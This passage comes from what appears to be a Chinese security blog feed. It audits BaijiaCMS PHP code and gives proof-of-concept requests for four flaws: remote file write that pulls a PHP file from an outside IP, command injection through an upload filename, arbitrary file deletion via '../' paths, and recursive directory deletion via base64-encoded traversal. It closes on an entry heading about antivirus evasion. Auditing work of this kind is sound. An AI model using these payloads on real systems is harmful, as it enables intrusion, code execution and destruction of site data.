operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$errors</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$errors</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string single-quoted-string">'00000'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// print_r($errors);</span>   <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$errors</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token variable">$errors</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>在代码审计中，我们可以使用自动化工具来帮助我们的工作，常见的代码审计自动化工具有Seay、Fortify等。</p><p>这里咱们直接使用seay进行分析，不过在之前我们需要了解一下代码结构</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">addons     插件api        接口assets     静态文件attachment 上传目录cache      缓存目录config     系统文件include    系统文件system     后端代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>像下面这些都是在系统文件中的公有函数，在后端逻辑代码中都有地方会对其进行调用，因此也是需要重点关注的内容之一</p><p><img src="image-20211123202651908.png"></p><p>接下来就是支撑相关功能的后端代码，在这里也会产生安全问题</p><p><img src="image-20211123203010201.png"></p><p>接下来我们对以上疑似存在漏洞的代码进行分析</p><h2 id="远程文件写入"><a href="#远程文件写入" class="headerlink" title="远程文件写入"></a>远程文件写入</h2><p>在/includes/baijiacms/common.inc.php有一个公有函数fetch_net_file_upload，<code>file_put_contents($file_tmp_name, file_get_contents($url)) == false</code>，这里首先生成了取出了url的后缀，然后随机生成文件名，然后写入到上传目录下，因此如果url可控，就会造成远程文件写入漏洞。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">fetch_net_file_upload</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$extention</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/attachment/'</span><span class="token punctuation">;</span>   <span class="token variable">$extpath</span><span class="token operator">=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$extention</span><span class="token punctuation">&#125;</span></span>/"</span> <span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y/m/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span> <span class="token operator">.</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$extpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$extention</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_WEBROOT</span> <span class="token operator">.</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$extpath</span><span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file_tmp_name</span> <span class="token operator">=</span> <span class="token constant">SYSTEM_WEBROOT</span> <span class="token operator">.</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$extpath</span><span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>      <span class="token variable">$file_relative_path</span> <span class="token operator">=</span> <span class="token variable">$extpath</span><span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_tmp_name</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'提取失败.'</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>      <span class="token variable">$file_full_path</span> <span class="token operator">=</span> <span class="token constant">WEB_ROOT</span> <span class="token operator">.</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$extpath</span><span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token function">file_save</span><span class="token punctuation">(</span><span class="token variable">$file_tmp_name</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$extention</span><span class="token punctuation">,</span><span class="token variable">$file_full_path</span><span class="token punctuation">,</span><span class="token variable">$file_relative_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过全局搜索、查找使用，在/system/public/class/web/file.php中找到一处调用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$do</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'fetch'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fetch_net_file_upload</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_error</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先我们在自己的vps中开启一个web服务，并放置一个php文件，通过路由构造出进入到该处的url，并要满足<code>op=fetch</code>，url填写远程文件的地址，然后传递过去，返回了地址则就是我们远程文件已经下载到目标上</p><p><code>http://baijia.test/index.php?mod=web&amp;act=public&amp;do=file&amp;beid=1&amp;op=fetch&amp;url=http://103.14.35.76:8000/test.php</code></p><p><img src="image-20211124085046322.png"></p><p><img src="image-20211124085224666.png"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><code>/includes/baijiacms/common.inc.php</code>第654行，system函数存在变量拼接，这是一个定义的file_save，凭借名字就能知道是保存文件相关的代码，主要拼接了$quality_command和$file_full_path，$file_full_path是传入的参数且函数内无过滤，如果外部可控即可能造成任意命令执行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">file_save</span><span class="token punctuation">(</span><span class="token variable">$file_tmp_name</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$extention</span><span class="token punctuation">,</span><span class="token variable">$file_full_path</span><span class="token punctuation">,</span><span class="token variable">$file_relative_path</span><span class="token punctuation">,</span><span class="token variable">$allownet</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$settings</span><span class="token operator">=</span><span class="token function">globaSystemSetting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_move</span><span class="token punctuation">(</span><span class="token variable">$file_tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$file_full_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'保存上传文件失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$settings</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image_compress_openscale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>                  <span class="token variable">$scal</span><span class="token operator">=</span><span class="token variable">$settings</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image_compress_scale'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token variable">$quality_command</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$scal</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token variable">$quality_command</span><span class="token operator">=</span><span class="token string single-quoted-string">' -quality '</span><span class="token operator">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$scal</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'convert'</span><span class="token operator">.</span><span class="token variable">$quality_command</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$file_full_path</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$file_full_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们就要去寻找该函数在哪调用过，这里可以使用Seay进行全局搜索</p><p><img src="image-20211124100944487.png"></p><p>首先在公有文件中定义其他函数时也调用过这个函数，<code>/system/weixin/class/web/setting.php</code>中直接调用过该函数</p><p>我们可以先看一下其他共有函数，根据上面的分析可知，我们要保证第四个参数可控，但是下图可以发现，这里通过随机数对文件名重命名，所以我们不能完全控制该传入参数</p><p><img src="image-20211124101844849.png"></p><p>那我们到<code>/system/weixin/class/web/setting.php</code>文件中看看传入该参数是否可控</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extention</span><span class="token operator">==</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$substr</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span> <span class="token variable">$substr</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>           <span class="token variable">$substr</span><span class="token operator">=</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token variable">$verify_root</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">,</span> <span class="token variable">$substr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>   <span class="token comment">//file_save($file['tmp_name'],$file['name'],$extention,$verify_root.$file['name'],$verify_root.$file['name'],false);</span>         <span class="token function">file_save</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$extention</span><span class="token punctuation">,</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$verify_root</span><span class="token operator">!=</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$verify_root</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>             <span class="token variable">$cfg</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'weixin_hasverify'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"不允许上传除txt结尾以外的文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果$extention为txt就会进入到file_save函数中，第四个参数为WEB_ROOT.”/“.$file[‘name’]，也就是说只要能控制$file[‘name’]就能够控制这个参数。</p><p><code>http://baijia.test/index.php?mod=site&amp;act=weixin&amp;do=setting&amp;beid=1</code></p><p><img src="image-20211124144559280.png"></p><p>上传文件的文件名为<code>&amp;whoami&amp;.txt</code>，然后提交，不过并没有执行我们的命令。</p><p>因此我们在该处打上断点，通过调试来确定问题，发现在进入之前会存在一个判断<code>!empty($settings[&#39;image_compress_openscale&#39;])</code>，由于$settings[‘image_compress_openscale’] = “0”导致并未执行到system那段函数之中</p><p><img src="image-20211124145700883.png"></p><p>通过追踪$settings变量，追踪到<code>$_CMS[&#39;system_globa_setting&#39;]</code></p><p><img src="image-20211124151608921.png"></p><p><img src="image-20211124151542963.png"></p><p>发现这里由init.inc.php 文件中<code>$_CMS[&#39;system_globa_setting&#39;]=globaPriveteSystemSetting();</code> 引入进来的，通过<code>globaPriveteSystemSetting</code>函数发现这里是对baijiacms_system_config数据表查询出来的值，因此我们只要能找到能更新该数据表的功能即可控制该值，发现函数<code>refreshSystemSetting</code>是对baijiacms_system_config数据表的更新操作，我们查看哪里发生了调用，在<code>\system\manager\class\web\netattach.php</code>中调用了该函数，直接访问该文件</p><p><a href="http://baijia.test/index.php?mod=web&amp;act=manager&amp;do=netattach&amp;beid=1">http://baijia.test/index.php?mod=web&amp;act=manager&amp;do=netattach&amp;beid=1</a></p><p>为一个附件设置的页面</p><p><img src="image-20211124152613931.png"></p><p>不出所料的话，就是将图片压缩比例功能设置为开启状态，然后再重复上传<code>&amp;whoami&amp;.txt</code>操作，我这里换成了执行ipconfig命令</p><p><img src="image-20211124152941605.png"></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>共有函数中file_delete中传入的参数未经过滤直接拼接$file_relative_path</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">file_delete</span><span class="token punctuation">(</span><span class="token variable">$file_relative_path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file_relative_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>      <span class="token variable">$settings</span><span class="token operator">=</span><span class="token function">globaSystemSetting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$settings</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'system_isnetattach'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>                   <span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span>      <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_WEBROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/attachment/'</span> <span class="token operator">.</span> <span class="token variable">$file_relative_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_WEBROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/attachment/'</span> <span class="token operator">.</span> <span class="token variable">$file_relative_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全局搜索，查看该函数调用，/system/eshop/core/mobile/util/uploader.php文件中存在调用，当<code>$operation == &#39;remove&#39;</code>，会将file参数拼接路径，然后进行删除操作。</p><p><img src="image-20211124162017573.png"></p><p>先在根目录下新建一个1.txt</p><p><a href="http://baijia.test/index.php?mod=mobile&amp;act=uploader&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../1.txt%EF%BC%8C%E4%BD%BF%E7%94%A8poc%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B01.txt%E8%A2%AB%E5%88%A0%E9%99%A4%E3%80%82">http://baijia.test/index.php?mod=mobile&amp;act=uploader&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../1.txt，使用poc之后发现1.txt被删除。</a></p><p>这里可以通过删除/config/install.link来造成重装漏洞</p><h2 id="目录删除"><a href="#目录删除" class="headerlink" title="目录删除"></a>目录删除</h2><p>该函数会递归目录下所有文件并且删除</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">rmdirs</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$isdir</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>               <span class="token variable">$file_list</span><span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span>               <span class="token punctuation">&#123;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span>                   <span class="token punctuation">&#123;</span>                         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'qrcode'</span><span class="token punctuation">)</span>                         <span class="token punctuation">&#123;</span>                       <span class="token function">rmdirs</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>                         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">!=</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'/cache/'</span><span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>               @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token punctuation">&#125;</span>           <span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token punctuation">&#123;</span>           @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看哪里对该函数进行了使用，<code>/system/manager/class/web/database.php</code>252行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$operation</span><span class="token operator">==</span><span class="token string single-quoted-string">'delete'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">WEB_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/config/data_backup/'</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">rmdirs</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">message</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'备份删除成功！'</span><span class="token punctuation">,</span> <span class="token function">create_url</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'site'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'act'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'manager'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'do'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'database'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'op'</span><span class="token operator">=></span><span class="token string single-quoted-string">'restore'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果进行删除操作，会将传入的id base64解码后拼接到路径上然后进入到rmdirs函数。</p><p>在根目录下新建一个test目录，../../test base64编码的结果为Li4vLi4vdGVzdA==</p><p><code>/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vdGVzdA==&amp;beid=1</code></p><p>poc输入之后发现根目录下的test目录已经被删除了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态完全免杀思路</title>
      <link href="/2021/11/18/jing-tai-wan-quan-mian-sha-si-lu/"/>
      <url>/2021/11/18/jing-tai-wan-quan-mian-sha-si-lu/</url>
      
